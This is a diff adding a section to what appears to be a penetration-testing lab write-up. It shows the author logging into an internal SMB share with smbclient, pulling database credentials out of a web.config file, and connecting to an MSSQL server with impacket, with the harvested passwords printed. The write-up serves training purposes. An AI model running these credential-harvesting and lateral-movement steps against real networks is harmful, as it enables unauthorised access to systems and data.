@@ -210,3 +210,26 @@ And we discover one valid user:
 
 **BR086  /  Welcome1**&#x20;
 
+### Database credentials
+
+To obtain the database credentials, we can check the shares with `smbclient`
+
+```
+smbclient //172.16.7.3/Department\ Shares --user br086
+```
+
+And for this user, there is a file called `web.config` on `Department shares/IT/Private`
+
+So now, we download the file and open it:&#x20;
+
+```
+User ID=netdb;Password=D@ta_bAse_adm1n!
+```
+
+**netdb  /  D@ta\_bAse\_adm1n!**
+
+To connect to the database, we need to use the tool `mssqlclient` from impacket.
+
+```
+impacket-mssqlclient netdb@172.16.7.60
+```
